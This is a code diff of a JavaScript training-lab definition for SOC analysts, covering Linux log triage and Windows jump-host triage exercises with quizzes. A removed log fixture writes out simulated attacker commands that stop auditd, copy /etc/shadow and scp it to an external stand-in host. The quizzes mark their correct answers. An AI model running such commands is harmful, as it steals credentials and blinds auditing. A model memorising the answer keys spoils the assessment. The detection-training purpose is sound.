-          { id: 'a', text: 'An exposed admin path expands the attack surface for credential stuffing or brute force', correct: true },
-          { id: 'b', text: 'Missing HttpOnly raises session-cookie theft risk if XSS is present', correct: true },
-          { id: 'c', text: 'A 200 response on /admin/ proves the app is fully patched', correct: false },
-          { id: 'd', text: 'HttpOnly only affects TLS certificate validation', correct: false },
-        ],
-        passThreshold: 'all-correct',
-        triggerOn: { stepId: 'sa-3.ex3.s2' },
-        reinforces: 'sa-3.ex3.s2',
-      },
+      { id: 'sa3-q1', bloom: 'analysis', question: 'Why does a matching request from a source other than the approved scanner change the finding assessment?', type: 'single-select', options: [
+        { id: 'a', text: 'It is evidence of possible activity beyond the authorized scan and needs incident validation.', correct: true },
+        { id: 'b', text: 'It proves customer data was accessed.', correct: false },
+        { id: 'c', text: 'It means the scanner report is invalid.', correct: false },
+      ], triggerOn: { stepId: 'sa-3.ex1.s2' }, reinforces: 'sa-3.ex1.s2' },
+      { id: 'sa3-q2', bloom: 'application', question: 'What should drive the initial priority rationale?', type: 'multi-select', passThreshold: 'all-correct', options: [
+        { id: 'a', text: 'Confirmed evidence in the report and access logs.', correct: true },
+        { id: 'b', text: 'The application’s customer-facing role and internet exposure.', correct: true },
+        { id: 'c', text: 'An assumption that exploitation succeeded.', correct: false },
+      ], triggerOn: { stepId: 'sa-3.ex1.s4' }, reinforces: 'sa-3.ex1.s4' },
     ],
 
     completion: { requireAllSteps: true, minQuizScore: 0.8 },
   };
 
   // ────────────────────────────────────────────────────────────
-  //  sa-4  System Log Assessment
+  //  sa-4  Linux Log Triage: The Audit Gap (L2)
   // ────────────────────────────────────────────────────────────
-  function buildSa4AuthLog() {
-    // Narrative: attacker stops auditd before privesc; password-guess + sudo abuse from temp.contractor.
-    return [
-      'Apr 22 08:00:01 DC-01 systemd[1]: Started Daily apt download activities.',
-      'Apr 22 08:14:05 DC-01 sshd[2118]: Accepted password for j.sanders from 10.10.24.42 port 51022 ssh2',
-      'Apr 22 08:14:05 DC-01 sshd[2118]: pam_unix(sshd:session): session opened for user j.sanders by (uid=0)',
-      'Apr 22 08:30:11 DC-01 sshd[2188]: Accepted publickey for m.chen from 10.10.24.18 port 51100 ssh2',
-      'Apr 22 09:00:33 DC-01 sudo: helpdesk-admin : TTY=pts/0 ; PWD=/home/helpdesk-admin ; USER=root ; COMMAND=/usr/bin/systemctl status sshd',
-      'Apr 22 14:01:18 DC-01 sshd[3211]: Failed password for temp.contractor from 198.51.100.42 port 38814 ssh2',
-      'Apr 22 14:01:21 DC-01 sshd[3211]: Failed password for temp.contractor from 198.51.100.42 port 38814 ssh2',
-      'Apr 22 14:01:24 DC-01 sshd[3211]: Failed password for temp.contractor from 198.51.100.42 port 38814 ssh2',
-      'Apr 22 14:01:26 DC-01 sshd[3211]: Failed password for temp.contractor from 198.51.100.42 port 38814 ssh2',
-      'Apr 22 14:01:30 DC-01 sshd[3211]: Failed password for temp.contractor from 198.51.100.42 port 38814 ssh2',
-      'Apr 22 14:01:32 DC-01 sshd[3211]: Failed password for temp.contractor from 198.51.100.42 port 38814 ssh2',
-      'Apr 22 14:01:35 DC-01 sshd[3211]: Failed password for temp.contractor from 198.51.100.42 port 38814 ssh2',
-      'Apr 22 14:02:09 DC-01 sshd[3219]: Accepted password for temp.contractor from 198.51.100.42 port 38922 ssh2',
-      'Apr 22 14:02:09 DC-01 sshd[3219]: pam_unix(sshd:session): session opened for user temp.contractor by (uid=0)',
-      'Apr 22 14:04:55 DC-01 sudo: temp.contractor : TTY=pts/3 ; PWD=/home/temp.contractor ; USER=root ; COMMAND=/bin/systemctl stop auditd',
-      'Apr 22 14:04:56 DC-01 systemd[1]: Stopping Security Auditing Service...',
-      'Apr 22 14:04:56 DC-01 systemd[1]: auditd.service: Deactivated successfully.',
-      'Apr 22 14:04:56 DC-01 systemd[1]: Stopped Security Auditing Service.',
-      'Apr 22 14:05:09 DC-01 sudo: temp.contractor : TTY=pts/3 ; PWD=/home/temp.contractor ; USER=root ; COMMAND=/bin/cp /etc/shadow /tmp/.cache.bak',
-      'Apr 22 14:06:21 DC-01 sudo: temp.contractor : TTY=pts/3 ; PWD=/home/temp.contractor ; USER=root ; COMMAND=/usr/bin/scp /tmp/.cache.bak temp.contractor@198.51.100.42:/home/temp.contractor/',
-      'Apr 22 14:42:11 DC-01 sshd[3219]: Received disconnect from 198.51.100.42 port 38922:11: disconnected by user',
-      'Apr 22 14:42:11 DC-01 sshd[3219]: pam_unix(sshd:session): session closed for user temp.contractor',
-    ].join('\n') + '\n';
-  }
-
-  function buildSa4Syslog() {
-    return [
-      'Apr 22 08:00:01 DC-01 systemd[1]: Started Daily apt download activities.',
-      'Apr 22 08:14:05 DC-01 systemd-logind[833]: New session 21 of user j.sanders.',
-      'Apr 22 09:00:33 DC-01 systemd[1]: Started Session 23 of user helpdesk-admin.',
-      'Apr 22 14:04:56 DC-01 systemd[1]: auditd.service: Deactivated successfully.',
-      'Apr 22 14:04:56 DC-01 systemd[1]: Stopped Security Auditing Service.',
-      'Apr 22 14:42:11 DC-01 systemd-logind[833]: Removed session 31.',
-    ].join('\n') + '\n';
-  }
-
-  function buildSa4Fs() {
-    return {
-      'home': { 'student': { '.bashrc': '' } },
-      'etc': {
-        'rsyslog.conf': '# /etc/rsyslog.conf\n# Forward all to a remote SIEM\n*.* @10.10.24.5:514\n',
-        'logrotate.d': { 'custom_logs': '/var/log/custom_log {\n    daily\n    rotate 7\n    compress\n    missingok\n    notifempty\n    create 0640 root utmp\n}\n' },
-        'logstash': { 'conf.d': { 'logstash.conf': 'input {\n  file { path => "/var/log/syslog" start_position => "beginning" }\n}\noutput {\n  elasticsearch { hosts => ["localhost:9200"] index => "syslog" }\n}\n' } },
-      },
-      'var': {
-        'log': {
-          'auth.log': buildSa4AuthLog(),
-          'syslog':   buildSa4Syslog(),
-          'auditd.journal': '-- No entries --\n',
-          'kern.log': '',
-        },
-      },
-      'tmp': {},
-      'run': { 'services': {} },
-    };
+  // The host is built at launch from the Operation Night Shift fixtures (seed A or B,
+  // fixed per learner). src/systems/linux-log-triage.js recomputes every expected fact
+  // from that host's own logs, so this definition contains no answer key.
+  function triageStep(id, phase, objective, kind, engineCheck, fields) {
+    return Object.assign({
+      id, phase, objective, kind,
+      validation: { type: 'nightShiftTriage', check: engineCheck },
+    }, fields);
   }
 
   const SA4_LAB = {
     id: 'sa-4',
     track: 'security-assessments',
-    title: 'System Log Assessment',
+    title: 'Linux Log Triage: The Audit Gap',
     difficulty: 'Intermediate',
-    estimatedTime: '55 min',
+    estimatedTime: '45 min',
     icon: '📜',
-    tags: ['Rsyslog', 'Logwatch', 'Logrotate', 'Splunk', 'ELK'],
+    tags: ['Log Triage', 'Incident Response', 'Audit Logging', 'Detection Gap'],
 
     source: {
       repo: '0xrajneesh/Security-Assessments-projects-for-Beginners',
@@ -796,204 +683,131 @@
       snapshot: 'src/data/sources/sa-4.source.md',
     },
 
-    environment: { type: 'linux', shell: 'LinuxTerminalShell', fs: buildSa4Fs },
+    environment: {
+      type: 'linux',
+      shell: 'NightShiftShell',
+      engine: 'MISSION_NEXT_LINUX_LOG_TRIAGE',
+      fixtureAware: true,
+      initialCwd: '/home/analyst',
+      fs: context => window.MISSION_NEXT_LINUX_LOG_TRIAGE.buildFs(context),
+    },
 
     scenario: {
-      role: 'SOC analyst on the log-review rotation',
-      incident: 'DC-01 stopped reporting audit events to the SIEM around 14:04 yesterday. Rsyslog forwarding looks healthy. Triage /var/log/auth.log and /var/log/syslog to find why audit data went silent.',
+      role: 'SOC analyst on the Detection & Analysis rotation',
+      incident: 'Your SIEM stopped receiving audit events from a Linux file server. Your ticket is in /home/analyst/ir-ticket.txt and authorizes read-only triage. The environment is already provisioned: rsyslog forwarding, the audit daemon and the logs are in place, so there is nothing to install. Find why telemetry stopped, which account is responsible, and what should have alerted.',
     },
 
     exercises: [
       {
         id: 'ex1',
-        upstreamHeading: 'Exercise 1: Configuring Centralized Logging with Rsyslog',
+        upstreamHeading: 'Preparation: confirm authority and forwarding health',
         steps: [
-          {
-            id: 'sa-4.ex1.s1',
-            upstream: { exercise: 'Exercise 1', stepNumber: 1, sourceLine: 'sudo apt-get install rsyslog' },
-            kind: 'command',
-            instruction: 'Install rsyslog.',
-            hint: '`sudo apt-get install rsyslog`',
-            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?apt-get\s+install\s+(-y\s+)?rsyslog\s*$/ }],
-            validation: { type: 'commandExecuted' },
+          triageStep('sa-4.ex1.s4', 'preparation', 'soc-03-lesson-01', 'command', 'ticketRead', {
+            upstream: { exercise: 'Preparation', stepNumber: 1, sourceLine: 'cat ir-ticket.txt' },
+            instruction: 'Read the ticket in your home directory. Confirm the host, the symptom and exactly what you are authorized to do.',
+            hint: '`cat /home/analyst/ir-ticket.txt`',
             points: 5,
-          },
-          {
-            id: 'sa-4.ex1.s2',
-            upstream: { exercise: 'Exercise 1', stepNumber: 2, sourceLine: 'Edit /etc/rsyslog.conf to forward to a remote log server' },
-            kind: 'command',
-            instruction: 'Read /etc/rsyslog.conf to confirm the forward rule.',
-            hint: '`cat /etc/rsyslog.conf`',
-            acceptedInputs: [{ type: 'regex', value: /^(less|cat|nano)\s+\/etc\/rsyslog\.conf\s*$/ }],
-            validation: { type: 'commandExecuted' },
+          }),
+          triageStep('sa-4.ex1.s2', 'preparation', 'soc-03-lesson-01', 'command', 'forwarderRule', {
+            upstream: { exercise: 'Preparation', stepNumber: 2, sourceLine: 'cat /etc/rsyslog.d/50-forward.conf' },
+            instruction: 'Read the rsyslog forward rule to confirm where this host sends its logs.',
+            hint: '`cat /etc/rsyslog.d/50-forward.conf`',
             points: 5,
-            checkOnLearning: 'sa4-q5',
-          },
-          {
-            id: 'sa-4.ex1.s3',
-            upstream: { exercise: 'Exercise 1', stepNumber: 3, sourceLine: 'sudo systemctl restart rsyslog' },
-            kind: 'command',
-            instruction: 'Restart rsyslog.',
-            hint: '`sudo systemctl start rsyslog` or `restart`',
-            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?systemctl\s+(start|restart)\s+rsyslog\s*$/ }],
-            validation: { type: 'commandExecuted' },
-            points: 5,
-          },
+          }),
+          triageStep('sa-4.ex1.s5', 'preparation', 'soc-03-lesson-01', 'analyze', 'gapTime', {
+            upstream: { exercise: 'Preparation', stepNumber: 3, sourceLine: 'systemctl status rsyslog' },
+            instruction: 'Check the forwarder. The rule is in place, but at what UTC time did the SIEM last receive an audit record from this host? Submit HH:MM:SS.',
+            hint: 'Try `systemctl status rsyslog` or read /var/log/siem-forwarder.log. Follow the audit stream, not the auth stream.',
+            answerLabel: 'Last audit record delivered (UTC)',
+            points: 10,
+          }),
         ],
       },
       {
         id: 'ex2',
-        upstreamHeading: 'Exercise 2: Log Analysis with Logwatch',
+        upstreamHeading: 'Detection & Analysis: triage authentication events',
         steps: [
-          {
-            id: 'sa-4.ex2.s1',
-            upstream: { exercise: 'Exercise 2', stepNumber: 1, sourceLine: 'sudo apt-get install logwatch' },
-            kind: 'command',
-            instruction: 'Install logwatch.',
-            hint: '`sudo apt-get install logwatch`',
-            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?apt-get\s+install\s+(-y\s+)?logwatch\s*$/ }],
-            validation: { type: 'commandExecuted' },
-            points: 5,
-          },
-          {
-            id: 'sa-4.ex2.s2',
-            upstream: { exercise: 'Exercise 2', stepNumber: 2, sourceLine: 'sudo logwatch --detail high --logfile /var/log/syslog --range today --service all --print' },
-            kind: 'command',
-            instruction: 'Generate a high-detail logwatch summary for today.',
-            hint: '`sudo logwatch --detail high --logfile /var/log/syslog --range today --service all --print`',
-            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?logwatch\s+(--detail\s+\w+)?(\s+--logfile\s+\/var\/log\/syslog)?(\s+--range\s+\w+)?(\s+--service\s+\w+)?(\s+--print)?\s*$/ }],
-            validation: { type: 'commandExecuted' },
+          triageStep('sa-4.ex2.s3', 'detection', 'soc-03-lesson-03', 'command', 'burst', {
+            upstream: { exercise: 'Analysis', stepNumber: 1, sourceLine: 'grep "Failed password" /var/log/auth.log' },
+            instruction: 'Surface the failed-password burst in /var/log/auth.log. Any tool works: show the events, or aggregate them by source.',
+            hint: '`grep "Failed password" /var/log/auth.log`, an awk filter, or `... | sort | uniq -c` on the source column. Several sources appear; look for the burst.',
             points: 10,
-            checkOnLearning: 'sa4-q2',
-          },
+          }),
+          triageStep('sa-4.ex2.s4', 'detection', 'soc-03-lesson-04', 'command', 'acceptedLogin', {
+            upstream: { exercise: 'Analysis', stepNumber: 2, sourceLine: 'grep "Accepted" /var/log/auth.log' },
+            instruction: 'Show the successful login that follows the burst, from the same source. Other logins are noise.',
+            hint: '`grep Accepted /var/log/auth.log` lists every success; pick the one after the burst.',
+            points: 10,
+          }),
+          triageStep('sa-4.ex2.s5', 'detection', 'soc-03-lesson-04', 'command', 'sudoUse', {
+            upstream: { exercise: 'Analysis', stepNumber: 3, sourceLine: 'grep "sudo:" /var/log/auth.log' },
+            instruction: 'Show what that account did with sudo.',
+            hint: '`grep sudo /var/log/auth.log`, or filter on the account name.',
+            points: 10,
+          }),
         ],
       },
       {
         id: 'ex3',
-        upstreamHeading: 'Exercise 3: Log Rotation with Logrotate',
+        upstreamHeading: 'Detection & Analysis: confirm the audit gap and build the timeline',
         steps: [
-          {
-            id: 'sa-4.ex3.s1',
-            upstream: { exercise: 'Exercise 3', stepNumber: 1, sourceLine: 'Edit /etc/logrotate.d/custom_logs' },
-            kind: 'command',
-            instruction: 'Read the existing custom_logs rotation policy.',
-            hint: '`cat /etc/logrotate.d/custom_logs`',
-            acceptedInputs: [{ type: 'regex', value: /^(less|cat|nano)\s+\/etc\/logrotate\.d\/custom_logs\s*$/ }],
-            validation: { type: 'commandExecuted' },
-            points: 5,
-          },
-          {
-            id: 'sa-4.ex3.s2',
-            upstream: { exercise: 'Exercise 3', stepNumber: 2, sourceLine: 'sudo logrotate -d /etc/logrotate.d/custom_logs' },
-            kind: 'command',
-            instruction: 'Dry-run logrotate against the custom_logs policy.',
-            hint: '`sudo logrotate -d /etc/logrotate.d/custom_logs`',
-            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?logrotate\s+-d\s+\/etc\/logrotate\.d\/custom_logs\s*$/ }],
-            validation: { type: 'commandExecuted' },
-            points: 5,
-          },
+          triageStep('sa-4.ex3.s3', 'detection', 'soc-03-lesson-03', 'command', 'auditStop', {
+            upstream: { exercise: 'Analysis', stepNumber: 4, sourceLine: 'journalctl -u UNIT' },
+            instruction: 'Confirm from the system journal or the audit trail that a security service was stopped after that sudo activity. Use whichever source you prefer.',
+            hint: 'Query the journal for a unit (`journalctl -u UNIT`), check `systemctl status UNIT`, run `ausearch -m SERVICE_STOP`, or grep the audit log.',
+            points: 10,
+            checkOnLearning: 'sa4-q1',
+          }),
+          triageStep('sa-4.ex3.s4', 'detection', 'SOC-101.4', 'analyze', 'timeline', {
+            upstream: { exercise: 'Timeline', stepNumber: 1, sourceLine: 'Build the incident timeline' },
+            instruction: 'Build the UTC timeline. List five events in chronological order, one per line, each as HH:MM:SS plus a short label: first failed password of the burst, successful login, first sudo command, audit service stop, and last audit record the SIEM received. Events in the same second may be listed either way.',
+            hint: 'Use the times you found in auth.log, the journal and the forwarder log.',
+            answerLabel: 'Timeline',
+            answerMultiline: true,
+            points: 15,
+            checkOnLearning: 'sa4-q2',
+          }),
         ],
       },
       {
         id: 'ex4',
-        upstreamHeading: 'Exercise 4: Real-time Log Monitoring with Splunk',
+        upstreamHeading: 'Detection & Analysis: findings for the IR lead',
         steps: [
-          {
-            id: 'sa-4.ex4.s1',
-            upstream: { exercise: 'Exercise 4', stepNumber: 1, sourceLine: 'wget splunk .deb && sudo dpkg -i splunk.deb' },
-            kind: 'command',
-            instruction: 'Download the Splunk .deb package.',
-            hint: '`wget https://download.splunk.com/products/splunk/releases/9.2.1/linux/splunk-9.2.1-amd64.deb`',
-            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?wget\s+https?:\/\/[^\s]+splunk[^\s]+\.deb\s*$/ }],
-            validation: { type: 'commandExecuted' },
-            points: 5,
-          },
-          {
-            id: 'sa-4.ex4.s2',
-            upstream: { exercise: 'Exercise 4', stepNumber: 2, sourceLine: 'sudo /opt/splunk/bin/splunk start --accept-license' },
-            kind: 'analyze',
-            instruction: 'Page through /var/log/auth.log and identify which user account succeeded after a burst of failed passwords. Submit just the username.',
-            hint: '`less /var/log/auth.log` — look for repeated "Failed password for X" then an "Accepted password for X" within seconds.',
-            validation: { type: 'valueExtracted', expected: ['temp.contractor'] },
-            points: 15,
-            checkOnLearning: 'sa4-q1',
-          },
-          {
-            id: 'sa-4.ex4.s3',
-            upstream: { exercise: 'Exercise 4', stepNumber: 3, sourceLine: 'Add /var/log as a Splunk data source' },
-            kind: 'analyze',
-            instruction: 'After that login, what privileged action did the same user take to suppress audit telemetry? Submit the systemd unit name they stopped.',
-            hint: 'grep auth.log for "sudo" and "stop" — look at the COMMAND= clause.',
-            validation: { type: 'valueExtracted', expected: ['auditd', 'auditd.service'] },
-            points: 15,
-          },
+          triageStep('sa-4.ex4.s4', 'detection', 'soc-03-lesson-04', 'analyze', 'sourceIp', {
+            upstream: { exercise: 'Escalation', stepNumber: 1, sourceLine: 'Report the source address' },
+            instruction: 'Which source address produced the burst of failed passwords? Submit only that address.',
+            hint: 'Aggregating the failures by source makes it obvious.',
+            answerLabel: 'Source IP',
+            points: 10,
+          }),
+          triageStep('sa-4.ex4.s2', 'detection', 'soc-03-lesson-04', 'analyze', 'account', {
+            upstream: { exercise: 'Escalation', stepNumber: 2, sourceLine: 'Report the account' },
+            instruction: 'Which account succeeded right after the burst? Submit just the username.',
+            hint: 'Look for an Accepted line after the failures, from the same source.',
+            answerLabel: 'Account',
+            points: 10,
+          }),
+          triageStep('sa-4.ex4.s3', 'detection', 'soc-03-lesson-04', 'analyze', 'unit', {
+            upstream: { exercise: 'Escalation', stepNumber: 3, sourceLine: 'Report the stopped service' },
+            instruction: 'After that login, which systemd unit did the same account stop to suppress telemetry? Submit the unit name.',
+            hint: 'The journal and the audit record both name it.',
+            answerLabel: 'Unit',
+            points: 10,
+          }),
         ],
       },
       {
         id: 'ex5',
-        upstreamHeading: 'Exercise 5: Visualizing Log Data with the ELK Stack',
+        upstreamHeading: 'Post-Incident: document the detection gap',
         steps: [
-          {
-            id: 'sa-4.ex5.s1',
-            upstream: { exercise: 'Exercise 5', stepNumber: 1, sourceLine: 'sudo apt-get install elasticsearch && sudo systemctl start elasticsearch' },
-            kind: 'command',
-            instruction: 'Start Elasticsearch.',
-            hint: '`sudo systemctl start elasticsearch`',
-            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?systemctl\s+start\s+elasticsearch\s*$/ }],
-            validation: { type: 'commandExecuted' },
-            points: 5,
-          },
-          {
-            id: 'sa-4.ex5.s2',
-            upstream: { exercise: 'Exercise 5', stepNumber: 2, sourceLine: 'sudo apt-get install logstash' },
-            kind: 'command',
-            instruction: 'Install Logstash.',
-            hint: '`sudo apt-get install logstash`',
-            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?apt-get\s+install\s+(-y\s+)?logstash\s*$/ }],
-            validation: { type: 'commandExecuted' },
-            points: 5,
-          },
-          {
-            id: 'sa-4.ex5.s3',
-            upstream: { exercise: 'Exercise 5', stepNumber: 3, sourceLine: 'Configure /etc/logstash/conf.d/logstash.conf' },
-            kind: 'command',
-            instruction: 'Read the Logstash pipeline config.',
-            hint: '`cat /etc/logstash/conf.d/logstash.conf`',
-            acceptedInputs: [{ type: 'regex', value: /^(less|cat|nano)\s+\/etc\/logstash\/conf\.d\/logstash\.conf\s*$/ }],
-            validation: { type: 'commandExecuted' },
-            points: 5,
-          },
-          {
-            id: 'sa-4.ex5.s4',
-            upstream: { exercise: 'Exercise 5', stepNumber: 4, sourceLine: 'sudo systemctl start logstash' },
-            kind: 'command',
-            instruction: 'Start Logstash.',
-            hint: '`sudo systemctl start logstash`',
-            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?systemctl\s+start\s+logstash\s*$/ }],
-            validation: { type: 'commandExecuted' },
-            points: 5,
-          },
-          {
-            id: 'sa-4.ex5.s5',
-            upstream: { exercise: 'Exercise 5', stepNumber: 5, sourceLine: 'sudo apt-get install kibana' },
-            kind: 'command',
-            instruction: 'Install Kibana.',
-            hint: '`sudo apt-get install kibana`',
-            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?apt-get\s+install\s+(-y\s+)?kibana\s*$/ }],
-            validation: { type: 'commandExecuted' },
-            points: 5,
-          },
-          {
-            id: 'sa-4.ex5.s6',
-            upstream: { exercise: 'Exercise 5', stepNumber: 6, sourceLine: 'Open http://localhost:5601 in a browser to view Kibana' },
-            kind: 'command',
-            instruction: 'Confirm Kibana is responding on its default port.',
-            hint: '`curl -s http://localhost:5601`',
-            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?(curl|wget)\s+(-s\s+)?https?:\/\/localhost:5601\/?\s*$/ }],
-            validation: { type: 'commandExecuted' },
-            points: 10,
-            checkOnLearning: 'sa4-q3',
-          },
+          triageStep('sa-4.ex5.s7', 'postIncident', 'SOC-101.5', 'analyze', 'caseNote', {
+            upstream: { exercise: 'Report', stepNumber: 1, sourceLine: 'Write a case note' },
+            instruction: 'Write the case note for the IR lead. Include the account, source address and failed-password count, the UTC time the service was stopped and which service it was, and your escalation. Then record the detection gap: state that nothing alerted when the service was stopped, and propose the detection rule that should be added for the M4 tuning backlog.',
+            hint: 'Separate what you observed from what you recommend. The rule should fire on an unexpected stop of a security service.',
+            answerLabel: 'Case note',
+            answerMultiline: true,
+            points: 15,
+          }),
         ],
       },
     ],
@@ -1002,72 +816,126 @@
       {
         id: 'sa4-q1',
         bloom: 'analysis',
-        question: 'You found 7 consecutive "Failed password for temp.contractor" entries followed by an "Accepted password" within ~30s, all from 198.51.100.42. Pick every reasonable conclusion.',
+        question: 'Why is stopping the audit daemon after gaining unauthorized sudo access an effective attack technique?',
         type: 'multi-select',
         options: [
-          { id: 'a', text: 'The account is being brute-forced from an external (RFC 5737) IP', correct: true },
-          { id: 'b', text: 'The successful login means the password was guessed or known', correct: true },
-          { id: 'c', text: 'temp.contractor merely mistyped their password seven times', correct: false },
-          { id: 'd', text: 'PAM lockout (pam_tally2 deny=5) is either disabled or misconfigured on this host', correct: true },
+          { id: 'a', text: 'It disables the primary endpoint-level logging and audit trail', correct: true },
+          { id: 'b', text: 'It creates a gap in detection between the privilege gain and later actions', correct: true },
+          { id: 'c', text: 'It causes the SIEM to go offline', correct: false },
+          { id: 'd', text: 'It deletes all prior log entries', correct: false },
+          { id: 'e', text: 'It prevents investigators from detecting subsequent lateral movement', correct: true },
         ],
         passThreshold: 'all-correct',
-        triggerOn: { stepId: 'sa-4.ex4.s2' },
-        reinforces: 'sa-4.ex4.s2',
+        triggerOn: { stepId: 'sa-4.ex3.s3' },
+        reinforces: 'sa-4.ex3.s3',
       },
       {
         id: 'sa4-q2',
-        bloom: 'application',
-        question: 'Your Logwatch summary still showed the key 14:04 system event even though full audit telemetry disappeared afterward. Which event best explains the gap?',
+        bloom: 'analysis',
+        question: 'You detect that the audit daemon was stopped by a non-admin account. What should your immediate containment action be?',
         type: 'single-select',
         options: [
-          { id: 'a', text: 'The host restarted rsyslog, interrupting remote forwarding only', correct: false },
-          { id: 'b', text: 'The attacker stopped auditd, blinding host-level audit events after the sudo action', correct: true },
-          { id: 'c', text: 'Logrotate compressed auth.log too early', correct: false },
-          { id: 'd', text: 'Kibana on port 5601 rejected the dashboard query', correct: false },
+          { id: 'a', text: 'Disable the account and restart the audit daemon immediately', correct: false },
+          { id: 'b', text: 'Snapshot the host state and syslog, escalate to IR, and recommend a rebuild', correct: true },
+          { id: 'c', text: 'Restart the audit daemon and monitor for new activity', correct: false },
+          { id: 'd', text: 'Wait for the next shift to investigate', correct: false },
         ],
-        triggerOn: { stepId: 'sa-4.ex2.s2' },
-        reinforces: 'sa-4.ex2.s2',
-      },
-      {
-        id: 'sa4-q3',
-        bloom: 'recall',
-        question: 'On default Debian/Ubuntu installs, which TCP port does Kibana listen on?',
-        type: 'short-answer',
-        acceptedAnswer: ['5601', 'tcp/5601'],
-        triggerOn: { stepId: 'sa-4.ex5.s6' },
-        reinforces: 'sa-4.ex5.s6',
-      },
-      {
-        id: 'sa4-q4',
-        bloom: 'comprehension',
-        question: 'The custom_logs logrotate policy specifies `rotate 7`. What does that number control?',
-        type: 'single-select',
-        options: [
-          { id: 'a', text: 'The number of days a single rotation covers', correct: false },
-          { id: 'b', text: 'The number of historical rotated copies retained', correct: true },
-          { id: 'c', text: 'The compression level', correct: false },
-          { id: 'd', text: 'The minimum size before rotating', correct: false },
-        ],
-        triggerOn: { stepId: 'sa-4.ex3.s2' },
-        reinforces: 'sa-4.ex3.s2',
-      },
-      {
-        id: 'sa4-q5',
-        bloom: 'comprehension',
-        question: 'The rsyslog line `*.* @10.10.24.5:514` means what?',
-        type: 'single-select',
-        options: [
-          { id: 'a', text: 'Forward all facilities and severities to 10.10.24.5 over UDP 514', correct: true },
-          { id: 'b', text: 'Forward only kernel logs to 10.10.24.5 over TCP 514', correct: false },
-          { id: 'c', text: 'Mirror all logs locally into /var/log/10.10.24.5', correct: false },
-          { id: 'd', text: 'Rotate all logs every 514 minutes', correct: false },
-        ],
-        triggerOn: { stepId: 'sa-4.ex1.s2' },
-        reinforces: 'sa-4.ex1.s2',
+        triggerOn: { stepId: 'sa-4.ex3.s4' },
+        reinforces: 'sa-4.ex3.s4',
       },
     ],
 
-    completion: { requireAllSteps: true, minQuizScore: 0.8 },
+    completion: { requireAllSteps: true, minQuizScore: 0.5 },
+  };
+
+  // ────────────────────────────────────────────────────────────
+  //  sa-6  Windows Jump Host Triage (L4, PowerShell)
+  // ────────────────────────────────────────────────────────────
+  function psStep(id, phase, objective, kind, check, fields) {
+    return Object.assign({ id, phase, objective, kind, validation:{ type:'powershellTriage', check } }, fields);
+  }
+  const SA6_LAB = {
+    id:'sa-6', track:'security-assessments', title:'Windows Jump Host Triage', difficulty:'Intermediate', estimatedTime:'45 min', icon:'🪟',
+    tags:['PowerShell','Windows Events','Persistence','Network Triage'],
+    environment:{ type:'windows', shell:'PowerShellShell', engine:'MISSION_NEXT_POWERSHELL_TRIAGE', fixtureAware:true, initialCwd:'C:\\Users\\Analyst' },
+    scenario:{ role:'SOC analyst on the Windows response queue', incident:'Ticket IR-NS-204 authorizes read-only triage of the Windows jump host and a containment handoff. Use the provided PowerShell object pipeline to correlate the Night Shift identity, inspect process and persistence evidence, assess the dropped file, and report the beacon. Do not disable accounts, delete tasks, or isolate the host; request containment from the incident commander. All commands run against a fictional browser simulation.' },
+    exercises:[
+      { id:'ex1', upstreamHeading:'Detection & Analysis: correlate the remote logon', steps:[
+        psStep('sa-6.ex1.s1','detection','soc-05-lesson-01','command','logon',{ instruction:'Query Security events and identify the successful type 10 remote logon that follows the failed attempts. Use Get-WinEvent with a Security filter, then narrow the objects with Where-Object and select useful fields.', hint:"Try `Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625,4624} | Where-Object {$_.Id -eq 4624} | Select-Object TimeCreated,TargetUserName,IpAddress,LogonType`.", points:10 }),
+        psStep('sa-6.ex1.s2','detection','soc-05-lesson-01','analyze','logonDetails',{ instruction:'Record the identity and source IP shown by the suspicious remote logon. The same identity appears in the Linux and cloud evidence.', answerLabel:'Identity and source IP', hint:'Use the matching 4624 row, not a nearby failed logon.', points:10 }),
+      ]},
+      { id:'ex2', upstreamHeading:'Detection & Analysis: reconstruct execution and persistence', steps:[
+        psStep('sa-6.ex2.s1','detection','soc-05-lesson-02','command','process',{ instruction:'Inspect 4688 process-creation evidence and trace the parent process to the launched script. Filter, select and sort the event objects as needed.', hint:'Get-WinEvent for Id 4688; the process row includes ParentImage, Image and CommandLine.', points:10 }),
+        psStep('sa-6.ex2.s2','detection','soc-05-lesson-03','command','processTree',{ instruction:'Use Get-CimInstance Win32_Process to inspect the parent/child process chain.', hint:'Filter on ProcessId or ParentProcessId, or select and sort the process objects.', points:10 }),
+        psStep('sa-6.ex2.s3','detection','soc-05-lesson-05','command','persistence',{ instruction:"Inspect scheduled tasks and identify the task outside Microsoft's task path that launches the staged script.", hint:"`Get-ScheduledTask | Where-Object {$_.TaskPath -notlike '\\Microsoft\\*'} | Format-Table`.", points:10 }),
+        psStep('sa-6.ex2.s4','detection','soc-05-lesson-05','command','run',{ instruction:'Inspect the machine Run key for the persistence value and its executable path.', hint:"`Get-ItemProperty 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' | Select-Object *`.", points:10 }),
+      ]},
+      { id:'ex3', upstreamHeading:'Detection & Analysis: evaluate the file and network activity', steps:[
+        psStep('sa-6.ex3.s1','detection','soc-05-lesson-06','command','hash',{ instruction:'Calculate the SHA256 hash of the dropped binary with Get-FileHash. Treat an unknown hash as a lead, not proof of maliciousness.', hint:'`Get-FileHash C:\\ProgramData\\Cache\\telemetry.exe`.', points:10 }),
+        psStep('sa-6.ex3.s2','detection','soc-05-lesson-06','analyze','hashAssessment',{ instruction:'Check the signature with Get-AuthenticodeSignature, then assess the sample. State that signer verification failed and prevalence is unknown; explain why the hash alone does not prove maliciousness.', answerLabel:'Assessment', answerMultiline:true, hint:'Use `Get-AuthenticodeSignature C:\\ProgramData\\Cache\\telemetry.exe`. This simulation has no reputation service, so prevalence is unknown; separate that gap from the hash itself.', points:10 }),
